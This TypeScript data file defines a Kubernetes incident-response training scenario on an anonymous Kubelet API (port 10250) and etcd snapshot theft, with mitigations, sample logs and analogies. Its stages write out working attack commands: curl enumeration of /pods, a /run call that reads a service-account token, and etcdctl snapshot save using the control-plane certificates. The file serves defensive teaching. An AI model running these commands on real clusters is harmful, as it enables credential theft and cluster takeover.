import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';
import type { ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: LegacyDraftScenario = {
    id: 'k8s-kubelet-anonymous-api-etcd-snapshot-forensics',
    title: 'CNCF Kubernetes Security, Microsoft Defender for Cloud & MITRE T1609 — Kubelet Read/Write Port 10250 & etcd Snapshot Forensics',
    category: 'CONTAINERS_KUBERNETES',
    mitreId: 'T1609',
    description:
      'Grounded in official Kubernetes Kubelet authentication/authorization documentation, Microsoft Defender for Cloud threat research, and MITRE ATT&CK Containers (T1609 / T1552.007): incident responders investigate misconfigured Kubelet API endpoints (--anonymous-auth=true / --authorization-mode=AlwaysAllow on TCP port 10250) and correlate container command execution (/run) with direct etcd database snapshot reads.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Internal Pod / Node Scanner', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Kubelet HTTPS API (:10250)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Container Runtime (containerd)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Kubelet Journald & Audit Log', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'etcd Key-Value Store (:2379)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Unauthenticated Pod Enumeration via Kubelet /pods Endpoint (:10250)',
        narration:
          'When Kubelet runs with --anonymous-auth=true and --authorization-mode=AlwaysAllow, any pod or host on the node network can query https://<node_ip>:10250/pods to retrieve full PodSpecs, environment variables, and mounted volume paths running on that worker node.',
        activeNodes: ['attacker', 'firewall', 'siem'],
        mitreTactic: 'Discovery (T1613 - Container and Resource Discovery)',
        technicalCommands: [
          'curl -sk https://10.10.20.11:10250/pods | jq ".items[].metadata.name"',
          'ps aux | grep kubelet | grep -- "--anonymous-auth"',
        ],
        defenseMitigation:
          'Set --anonymous-auth=false and --authorization-mode=Webhook in /var/lib/kubelet/config.yaml across all worker nodes and block port 10250 from pod CIDR ranges.',
        logs: [
          {
            id: 'k8s-kubelet-1',
            timestamp: '11:02:11.045',
            source: 'Linux Audit',
            severity: 'high',
            EventCode: 10250,
            ProcessName: 'kubelet',
            CommandLine: 'GET /pods HTTP/1.1 (Kubelet API Port 10250 Anonymous Request)',
            raw: 'kubelet[1420]: I1116 11:02:11.045112 server.go:462] "GET /pods"Resp=200 RemoteAddr="10.244.1.18:49210" User="system:anonymous"',
            parsedFields: {
              KubeletEndpoint: 'GET /pods (:10250)',
              AuthenticatedUser: 'system:anonymous',
              AuthorizationMode: 'AlwaysAllow (Misconfigured)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Remote Command Execution Inside Privileged Pod via Kubelet /run Endpoint',
        narration:
          'Using the pod namespace, pod name, and container name discovered from /pods, a POST request to /run/<namespace>/<pod>/<container> instructs Kubelet to invoke the CRI ExecSync RPC on containerd, executing arbitrary commands inside a privileged kube-system pod.',
        activeNodes: ['attacker', 'firewall', 'target', 'siem'],
        mitreTactic: 'Execution (T1609 - Container Administration Command)',
        technicalCommands: [
          'curl -sk -X POST "https://10.10.20.11:10250/run/kube-system/kube-proxy-x892a/kube-proxy" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"',
        ],
        defenseMitigation:
          'Monitor kubelet journald logs and CRI containerd events for /run or /exec requests that do not originate from the control-plane kube-apiserver IP.',
        logs: [
          {
            id: 'k8s-kubelet-2',
            timestamp: '11:02:18.610',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 59,
            ProcessName: 'containerd-shim',
            CommandLine: 'POST /run/kube-system/kube-proxy-x892a/kube-proxy cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token',
            raw: 'kubelet[1420]: I1116 11:02:18.610982 server.go:462] "POST /run/kube-system/kube-proxy-x892a/kube-proxy" Resp=200 RemoteAddr="10.244.1.18:49214"',
            parsedFields: {
              KubeletApiAction: 'POST /run/kube-system/kube-proxy-x892a/kube-proxy',
              TargetNamespace: 'kube-system',
              CriOperation: 'ExecSync via containerd-shim-runc-v2',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Control-Plane etcd Snapshot Extraction (/var/lib/etcd/member/snap/db)',
        narration:
          'If the compromised node hosts control-plane static pods or mounts /etc/kubernetes/pki/etcd, etcdctl snapshot save dumps the entire cluster state database (/registry/secrets/*), which DFIR analysts verify in etcd gRPC access logs and auditd file reads.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1552.007 - Unsecured Credentials: Container API)',
        technicalCommands: [
          'ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key snapshot save /tmp/etcd-snapshot.db',
        ],
        defenseMitigation:
          'Enable Kubernetes EncryptionConfiguration (AES-CBC or KMS v2) at rest for Secrets stored in etcd so offline snapshots of /var/lib/etcd/member/snap/db do not expose plaintext credentials.',
        logs: [
          {
            id: 'k8s-kubelet-3',
            timestamp: '11:02:29.402',
            source: 'Linux Audit',
            severity: 'critical',
            EventCode: 2379,
            ProcessName: 'etcdctl',
            CommandLine: 'etcdctl --endpoints=https://127.0.0.1:2379 snapshot save /tmp/etcd-snapshot.db',
            raw: 'type=SYSCALL msg=audit(1763290949.402:608): arch=c000003e syscall=59 success=yes exe="/usr/local/bin/etcdctl" comm="etcdctl" key="etcd_snapshot_dump"',
            parsedFields: {
              DatabaseTarget: 'etcd (:2379) /var/lib/etcd/member/snap/db',
              OutputArtifact: '/tmp/etcd-snapshot.db',
              KeyPrefixTargeted: '/registry/secrets/kube-system/',
            },
          },
        ],
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
    briefing: {
      storyAnalogy:
        'Imagine an apartment tower whose floor-manager desk has no receptionist, no sign-in book, and an open intercom linking every suite. Any unbadged visitor can walk up to the desk to grab the complete tenant directory, speak an order straight into the maintenance penthouse to unlock the boiler room, and photograph the entire building master safe archive stored on the control floor.',
      storyMappings: [
        {
          storyTerm: 'Unguarded floor-manager desk with no sign-in book',
          technicalTerm: 'Kubelet port 10250 running with --anonymous-auth=true and AlwaysAllow',
          tone: 'amber',
        },
        {
          storyTerm: 'Grabbing the complete tenant directory',
          technicalTerm: 'Unauthenticated GET https://<node>:10250/pods enumeration',
          tone: 'sky',
        },
        {
          storyTerm: 'Speaking an order straight into the maintenance penthouse',
          technicalTerm: 'Unauthenticated POST /run/<namespace>/<pod>/<container> remote command execution',
          tone: 'rose',
        },
        {
          storyTerm: 'Photographing the building master safe archive',
          technicalTerm: 'Dumping /var/lib/etcd/member/snap/db via etcdctl snapshot save',
          tone: 'emerald',
        },
      ],
    },
    steps: {
      1: {
        storyAnalogy:
          'Walking up to the unguarded floor-manager desk, the intruder asks for the full occupancy clipboard without showing a single badge. The desk gladly hands back every suite number, resident name, and which suites hold master maintenance keys.',
        storyMappings: [
          {
            storyTerm: 'Unguarded floor-manager desk',
            technicalTerm: 'Misconfigured Kubelet API on TCP port 10250 allowing anonymous requests',
            tone: 'amber',
          },
          {
            storyTerm: 'Full occupancy clipboard',
            technicalTerm: 'JSON response from GET /pods listing namespaces, pod names, and containers',
            tone: 'sky',
          },
          {
            storyTerm: 'Zero badge verification',
            technicalTerm: '--anonymous-auth=true paired with --authorization-mode=AlwaysAllow',
            tone: 'rose',
          },
          {
            storyTerm: 'Suites holding master maintenance keys',
            technicalTerm: 'High-privilege system or control-plane pods scheduled on the node',
            tone: 'emerald',
          },
        ],
      },
      2: {
        storyAnalogy:
          'Picking the most privileged maintenance suite straight off the occupancy clipboard, the intruder presses the desk direct intercom button and issues live work orders inside that suite as though standing inside the room personally.',
        storyMappings: [
          {
            storyTerm: 'Direct intercom button on the floor desk',
            technicalTerm: 'Kubelet POST /run/<namespace>/<pod>/<container> execution endpoint',
            tone: 'amber',
          },
          {
            storyTerm: 'Issuing live work orders inside the suite',
            technicalTerm: 'Arbitrary command execution inside a running privileged container',
            tone: 'sky',
          },
          {
            storyTerm: 'Suite coordinates from the clipboard',
            technicalTerm: 'Target namespace, pod, and container names discovered via /pods',
            tone: 'rose',
          },
          {
            storyTerm: 'Bypasses the main building lobby',
            technicalTerm: 'Direct node-level execution skipping kube-apiserver RBAC and audit logs',
            tone: 'emerald',
          },
        ],
      },
      3: {
        storyAnalogy:
          'Standing inside a control-floor suite with direct access to the vault certificates, the intruder takes a complete instant photograph of the building master ledger cabinet, capturing every resident key, rulebook, and secret stored across the entire tower.',
        storyMappings: [
          {
            storyTerm: 'Vault certificates on the control floor',
            technicalTerm: 'Mounted /etc/kubernetes/pki/etcd client certificates and keys',
            tone: 'amber',
          },
          {
            storyTerm: 'Instant photograph of the master ledger cabinet',
            technicalTerm: 'etcdctl snapshot save capturing /var/lib/etcd/member/snap/db',
            tone: 'sky',
          },
          {
            storyTerm: 'Every resident key and secret across the tower',
            technicalTerm: 'Complete unencrypted Kubernetes cluster Secrets and ServiceAccount tokens in etcd',
            tone: 'rose',
          },
          {
            storyTerm: 'Total building takeover',
            technicalTerm: 'Full cluster administrative compromise derived offline from the etcd snapshot',
            tone: 'emerald',
          },
        ],
      },
    },
  };
